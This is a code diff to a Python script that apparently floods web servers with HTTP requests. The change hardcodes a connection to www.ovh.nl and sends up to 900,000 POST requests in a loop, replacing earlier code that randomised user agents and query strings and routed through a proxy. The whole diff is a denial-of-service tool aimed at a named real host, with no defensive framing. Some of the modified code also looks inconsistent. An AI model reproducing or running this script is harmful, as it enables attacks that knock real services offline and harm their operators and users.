@@ -7,7 +7,7 @@
 #
 # author :  Barry Shteiman , version 1.0
 # ----------------------------------------------------------------------------------------------
-import urllib2
+import httplib
 import sys
 import threading
 import random
@@ -83,19 +83,11 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Host',host)
-	request.add_header('Content-type', 'application/x-www-form-urlencoded')
-        request.get_method = lambda: "POST"
-        proxy_support = urllib2.ProxyHandler({"https": "https://www.ovh.nl"})
-        opener = urllib2.build_opener(proxy_support)
-
-        urllib2.install_opener(opener)
+	request = httplib.HTTPConnection("www.ovh.nl", 80)
 	try:
 		for i in range(900000):
 		
-			urllib2.urlopen(request)
+			request.request('POST', url)
 	except socket.error:
 			#print e.code
 			set_flag(1)
@@ -103,7 +95,7 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			request.request('POST', url)
 	return(code)		
 
 	
